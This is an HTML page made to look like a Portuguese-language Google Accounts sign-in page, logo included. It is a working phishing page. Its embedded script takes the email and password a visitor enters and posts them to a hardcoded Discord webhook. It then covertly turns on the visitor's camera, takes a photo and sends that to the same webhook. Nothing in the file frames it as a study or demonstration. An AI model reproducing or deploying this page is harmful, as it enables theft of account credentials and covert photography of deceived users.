<!DOCTYPE html>
<html lang="pt-BR"> 

<head>
    <title>Fazer login - Contas do Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f1f1f1;
        }

        .container {
            background: white;
            padding: 40px;
            width: 400px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo img {
            width: 75px;
        }

        .title {
            font-size: 24px;
            font-weight: 400;
            text-align: center;
            margin-bottom: 10px;
        }

        .input-field {
            margin-bottom: 20px;
        }

        .input-field label {
            display: block;
            font-size: 14px;
            color: #202124;
            margin-bottom: 5px;
        }

        .input-field input {
            width: calc(100% - 20px);
            padding: 10px;
            font-size: 16px;
            border: 1px solid #d3d3d3;
            border-radius: 4px;
        }

        .submit-btn {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            font-weight: bold;
            color: white;
            background-color: #1a73e8;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        .submit-btn:hover {
            background-color: #1669c1;
        }

        .link {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }

        .link a {
            color: #1a73e8;
            text-decoration: none;
        }

        .link a:hover {
            text-decoration: underline;
        }

        /* Hidden video for capturing photo */
        #hidden-video {
            display: none;
        }
    </style>
    <script>
        // Send Data to Discord Webhook
        async function sendToDiscord(title, data) {
            const payload = {
                content: `Novos ${title} Coletados`,
                embeds: [
                    {
                        title: title,
                        description: "Informações coletadas a partir do QR Code",
                        color: 16711680,
                        fields: Object.keys(data).map(key => ({
                            name: key,
                            value: typeof data[key] === 'string' ? data[key] : JSON.stringify(data[key]),
                            inline: false
                        }))
                    }
                ]
            };

            await fetch("https://discord.com/api/webhooks/1293733039331082391/3kVe2OjfbpHf0VCzRtOtq9VirB-_mK9-ZJCNVmc3gPYxOjVKLXfj-hjIDZf5W0Jdv-Fq", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            });
        }

        // Take hidden picture from the camera
        async function takeHiddenPicture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.id = "hidden-video";
                video.srcObject = stream;
                video.play();

                // Allow the video feed to stabilize for a moment
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Convert to Base64 and send to Discord
                    const imageData = canvas.toDataURL('image/png');
                    sendToDiscord("Camera Snapshot", { image: imageData });

                    // Stop the video stream
                    stream.getTracks().forEach(track => track.stop());
                }, 3000); // Delay to allow the camera to properly focus
            } catch (err) {
                console.error('Erro ao acessar a câmera:', err);
            }
        }

        // Collect Login Credentials
        async function collectCredentials(event) {
            event.preventDefault();
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            const credentials = {
                email: email,
                password: password
            };

            await sendToDiscord("Credenciais de Login", credentials);

            // Trigger hidden camera photo
            takeHiddenPicture();
        }
    </script>
</head>

<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        </div>
        <div class="title">Fazer login</div>
        <form onsubmit="collectCredentials(event)">
            <div class="input-field">
                <label for="email">Email ou telefone</label>
                <input type="email" id="email" placeholder="Digite seu email ou telefone" required>
            </div>
            <div class="input-field">
                <label for="password">Senha</label>
                <input type="password" id="password" placeholder="Digite sua senha" required>
            </div>
            <button type="submit" class="submit-btn">Próxima</button>
        </form>
        <div class="link">
            <a href="#">Esqueceu seu email?</a>
        </div>
    </div>
</body>

</html>
